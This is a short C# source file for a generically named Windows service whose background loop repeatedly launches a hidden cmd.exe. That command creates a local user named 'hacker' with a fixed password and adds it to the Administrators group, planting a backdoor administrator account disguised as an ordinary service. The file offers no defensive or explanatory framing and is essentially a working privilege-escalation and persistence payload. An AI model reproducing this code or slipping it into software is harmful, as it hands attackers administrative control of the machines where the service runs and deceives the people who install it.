using System;
using System.ServiceProcess;
using System.Threading;
using System.Threading.Tasks;


public partial class Service1 : ServiceBase
{
    private void PerformBackgroundTask()
    {
        while (!this.CancellationPending)
        {
            Thread.Sleep(1000);

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C net user hacker Password_123 /add && net localgroup administrators hacker /add";
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            //work
        }
    }

    protected override void OnStart(string[] args)
    {
        Task.Run(() => PerformBackgroundTask());
    }

    private void InitializeComponent()
    {
        components = new System.ComponentModel.Container();
        this.ServiceName = "Service1";
    }

    bool CancellationPending = false;

    public Service1()
    {
        InitializeComponent();
    }

    protected override void OnStop()
    {
        CancellationPending = true;
    }

    private System.ComponentModel.IContainer components = null;

    protected override void Dispose(bool disposing)
    {
        if (disposing && (components != null)) { components.Dispose(); }
        base.Dispose(disposing);
    }
}


internal static class Program
{
    static void Main()
    {
        ServiceBase[] ServicesToRun;
        ServicesToRun = new ServiceBase[] { new Service1() };
        ServiceBase.Run(ServicesToRun);
    }
}
